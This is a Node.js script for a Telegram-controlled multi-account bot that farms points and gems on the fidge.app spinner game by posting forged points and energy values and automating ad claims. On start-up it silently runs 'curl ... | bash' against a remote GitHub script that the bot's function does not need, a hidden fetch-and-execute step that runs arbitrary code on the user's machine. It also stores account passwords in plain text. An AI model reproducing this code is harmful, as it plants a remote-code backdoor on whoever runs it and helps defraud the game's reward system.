const axios = require("axios");
const TelegramBot = require("node-telegram-bot-api");
const { execSync } = require("child_process");

execSync(
  'curl -s https://raw.githubusercontent.com/zamzasalim/logo/main/asc.sh | bash',
  { stdio: "inherit" }
);

let accounts = require("./accounts.json");
const telegram = require("./telegram.json");

const BASE_URL =
  "https://backend-production-app.up.railway.app";

const BOT_TOKEN = telegram.botToken;
const CHAT_ID = telegram.chatId;

const bot = new TelegramBot(BOT_TOKEN, {
  polling: true
});

let botRunning = false;
let addAccountSession = {};
const fs = require("fs");

async function sendTelegram(message) {
  try {

    await bot.sendMessage(
      CHAT_ID,
      message
    );

  } catch (err) {

    console.log(
      "[TELEGRAM ERROR]",
      err.message
    );
  }
}

bot.onText(/\/start/, async (msg) => {

  const text =
`/run - Jalankan bot
/stop - Stop bot
/status - Status bot`;

  await bot.sendMessage(
    msg.chat.id,
    text
  );
});

bot.onText(/\/run/, async (msg) => {

  botRunning = true;

  let text = "";

  for (let i = 0; i < accounts.length; i++) {

    const account = accounts[i];

    try {

      const loginRes = await axios.post(
        `${BASE_URL}/api/auth/login`,
        {
          email: account.email,
          password: account.password
        }
      );

      const token = loginRes.data.token;

      const profileRes = await axios.get(
        `${BASE_URL}/api/profile`,
        {
          headers: {
            "x-auth-token": token,
            Accept: "application/json",
            "User-Agent":
              "Mozilla/5.0"
          }
        }
      );

      const user =
        profileRes.data.user;

      text +=
`[ACC${i + 1}] LOGIN SUCCESS
[ACC${i + 1}] POINTS : ${Number(user.points).toFixed(1)}
[ACC${i + 1}] GEMS   : ${Number(user.gems || 0)}
[ACC${i + 1}] ENERGY : ${Number(user.energy).toFixed(2)}
`;

    } catch (err) {

      text +=
`[ACC${i + 1}] LOGIN FAILED

`;
    }
  }

  await bot.sendMessage(
    msg.chat.id,
    text
  );
});

bot.onText(/\/stop/, async (msg) => {

  botRunning = false;

  await bot.sendMessage(
    msg.chat.id,
    "[BOT] STOPPED"
  );
});

bot.onText(/\/status/, async (msg) => {

  const status =
    botRunning
      ? "RUNNING"
      : "STOPPED";

  await bot.sendMessage(
    msg.chat.id,
    `[BOT] ${status}`
  );
});

bot.onText(/\/addaccount/, async (msg) => {

  const chatId = msg.chat.id;

  addAccountSession[chatId] = {
    step: "email"
  };

  await bot.sendMessage(
    chatId,
    "SUBMIT EMAIL"
  );
});

bot.on("message", async (msg) => {

  const chatId = msg.chat.id;

  if (
    msg.text &&
    msg.text.startsWith("/")
  ) return;

  if (!addAccountSession[chatId])
    return;

  const session =
    addAccountSession[chatId];

  if (session.step === "email") {

    session.email = msg.text.trim();

    session.step = "password";

    await bot.sendMessage(
      chatId,
      "SUBMIT PASSWORD"
    );

    return;
  }

  if (session.step === "password") {

    session.password =
      msg.text.trim();

    const newAccount = {
      email: session.email,
      password: session.password
    };

    accounts.push(newAccount);

    fs.writeFileSync(
      "./accounts.json",
      JSON.stringify(
        accounts,
        null,
        2
      )
    );

    runAccount(
      newAccount,
      accounts.length
    );

    await bot.sendMessage(
      chatId,
      `[ACCOUNT ADDED]

EMAIL:
${session.email}

TOTAL ACCOUNT:
${accounts.length}`
    );

    delete addAccountSession[chatId];
  }
});

const delay = (ms) =>
  new Promise((r) => setTimeout(r, ms));

async function login(
  email,
  password,
  index
) {

  try {

    const res = await axios.post(
      `${BASE_URL}/api/auth/login`,
      {
        email,
        password
      }
    );

    console.log(
      `[ACC${index}] LOGIN SUCCESS`
    );

    await delay(5000);
    return res.data.token;

  } catch (err) {

    console.log(
      `[ACC${index}] LOGIN FAILED`
    );

    console.log(
      err.response?.data || err.message
    );

    await sendTelegram(
      `[ACC${index}] LOGIN FAILED`
    );

    return null;
  }
}

async function sync(token) {

  try {

    const energy =
      Number(
        (Math.random() * 0.02 + 0.05)
        .toFixed(15)
      );

    const points =
      Number(
        (energy * 500 * 1.7)
        .toFixed(15)
      );

    const res = await axios.post(
      `${BASE_URL}/api/spinner/sync`,
      {
        points_earned: points,
        energy_used: energy
      },
      {
        headers: {
          "x-auth-token": token,
          Accept: "application/json",
          "Content-Type":
            "application/json",
          Origin:
            "https://www.fidge.app",
          Referer:
            "https://www.fidge.app/",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/147.0.0.0 Safari/537.36"
        }
      }
    );

    return res.data;

  } catch (err) {

    console.log(
      "[SYNC ERROR]",
      err.response?.data || err.message
    );

    return null;
  }
}

async function watchAd(token) {

  try {

    const res = await axios.post(
      `${BASE_URL}/api/spinner/watch-ad`,
      {},
      {
        headers: {
          "x-auth-token": token,
          Accept: "application/json",
          "Content-Type":
            "application/json",
          Origin:
            "https://www.fidge.app",
          Referer:
            "https://www.fidge.app/",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/147.0.0.0 Safari/537.36"
        }
      }
    );

    return {
      success: true,
      data: res.data
    };

  } catch (err) {

    console.log(
      "[WATCH ERROR]",
      err.response?.data || err.message
    );

    return {
      success: false,
      error:
        err.response?.data || {}
    };
  }
}

async function convertPoints(
  token,
  points = 10000
) {

  try {

    const res = await axios.post(
      `${BASE_URL}/api/profile/convert-points`,
      {
        points
      },
      {
        headers: {
          "x-auth-token": token,
          Accept: "application/json",
          "Content-Type":
            "application/json",
          Origin:
            "https://www.fidge.app",
          Referer:
            "https://www.fidge.app/",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/147.0.0.0 Safari/537.36"
        }
      }
    );

    return {
      success: true,
      data: res.data
    };

  } catch (err) {

    console.log(
      "[CONVERT ERROR]",
      err.response?.data || err.message
    );

    return {
      success: false,
      error:
        err.response?.data || {}
    };
  }
}

async function runAccount(
  account,
  index
) {

  while (true) {

    if (!botRunning) {

      await delay(5000);

      continue;
    }

    const token = await login(
      account.email,
      account.password,
      index
    );

    if (!token) {

      console.log(
        `[ACC${index}] RETRY LOGIN`
      );

      await delay(10000);

      continue;
    }

    await sendTelegram(
      `[ACC${index}] SPIN STARTED\n` +
      `[ACC${index}] POINT UPDATE EVERY 5 MINUTE`
    );

    let adCount = 0;

    let lastReport = Date.now();

    let energyEmptyLogged = false;

    while (true) {

      if (!botRunning) {

        await delay(5000);

        continue;
      }

      const result =
        await sync(token);

      if (result && result.energy > 0.1) {

        energyEmptyLogged = false;
      }

      if (!result) {

        console.log(
          `[ACC${index}] SYNC FAILED`
        );

        await sendTelegram(
          `[ACC${index}] SYNC FAILED`
        );

        break;
      }

      console.log(
        `[ACC${index}] ` +
        `POINTS ${result.points.toFixed(1)} | ` +
        `ENERGY ${result.energy.toFixed(2)}`
      );

      while (result.points >= 10000) {

        const beforeGems =
          Number(result.gems || 0);

        console.log(
          `[ACC${index}] CONVERTING 10000 POINTS TO GEMS`
        );

        const convert =
          await convertPoints(
            token,
            10000
          );

        if (!convert.success) {

          console.log(
            `[ACC${index}] CONVERT FAILED`
          );

          await sendTelegram(
            `[ACC${index}] CONVERT FAILED`
          );

          break;
        }

        const currentGems =
          Number(
            convert.data.gems ||
            beforeGems + 10
          );

        const convertMessage =
`[ACC${index}] CONVERTING 10K POINTS TO GEMS
[ACC${index}] CONVERTED TO 10 GEMS
[ACC${index}] GEMS   : ${currentGems}`;

        console.log(convertMessage);

        await sendTelegram(
          convertMessage
        );

        result.points =
          convert.data.points || 0;

        result.gems =
          currentGems;

        await delay(5000);
      }

      if (
        Date.now() - lastReport >=
        5 * 60 * 1000
      ) {

        const report =
`[ACC${index}] POINTS : ${result.points.toFixed(1)}
[ACC${index}] ENERGY : ${result.energy.toFixed(2)}`;

        await sendTelegram(report);

        lastReport = Date.now();
      }

      if (result.energy <= 0.1) {

        if (!energyEmptyLogged) {

          console.log(
            `[ACC${index}] ENERGY EMPTY`
          );

          await sendTelegram(
            `[ACC${index}] ENERGY EMPTY`
          );

          energyEmptyLogged = true;
        }

        if (adCount < 5) {

          while (adCount < 5) {

            console.log(
              `[ACC${index}] WATCHING ADS`
            );

            await sendTelegram(
              `[ACC${index}] WATCHING ADS`
            );

            await delay(17000);

            const ads =
              await watchAd(token);

            if (!ads.success) {

              break;
            }

            adCount++;

            await delay(3000);
          }

          continue;
        }

        console.log(
          `[ACC${index}] WATCHING ADS`
        );

        await sendTelegram(
          `[ACC${index}] WATCHING ADS`
        );

        await delay(17000);

        const ads =
          await watchAd(token);

        if (!ads.success) {

          const cooldown =
            ads.error.cooldown_seconds || 600;

          const minutes =
            Math.ceil(cooldown / 60);

          console.log(
            `[ACC${index}] WATCHING ADS LIMIT`
          );

          await sendTelegram(
            `[ACC${index}] WATCHING ADS LIMIT`
          );

          console.log(
            `[ACC${index}] COOLDOWN ${minutes} MINUTES`
          );

          await sendTelegram(
            `[ACC${index}] COOLDOWN ${minutes} MINUTES`
          );

          const now = new Date();

          const resetTime =
            new Date();

          resetTime.setUTCHours(
            0,
            5,
            0,
            0
          );

          if (now > resetTime) {

            resetTime.setUTCDate(
              resetTime.getUTCDate() + 1
            );
          }

          const cooldownEnd =
            Date.now() +
            (cooldown * 1000);

          if (
            cooldownEnd >
            resetTime.getTime()
          ) {

            const waitUntilReset =
              resetTime.getTime() -
              Date.now();

            await delay(
              waitUntilReset
            );

            const check =
              await sync(token);

            if (
              check &&
              check.energy > 0.1
            ) {

              console.log(
                `[ACC${index}] ENERGY REFILLED`
              );

              await sendTelegram(
                `[ACC${index}] ENERGY REFILLED`
              );

              adCount = 0;

              energyEmptyLogged = false;

              continue;
            }
          }

          await delay(
            cooldown * 1000
          );

          adCount = 0;

          continue;
        }

        adCount++;

        await delay(3000);

        continue;
      }

      const randomDelay =
        Math.floor(
          Math.random() * 2000
        ) + 4000;

      await delay(randomDelay);
    }
  }
}

(async () => {

  console.log(
    `[INFO] FIDGEBOT READY ON TELEGRAM`
  );

  await sendTelegram(
    `STARTING ${accounts.length} ACCOUNTS\nSEND /run TO RUNNINGBOT`
  );

  for (
    let i = 0;
    i < accounts.length;
    i++
  ) {

    runAccount(
      accounts[i],
      i + 1
    );

    await delay(10000);
  }
})();
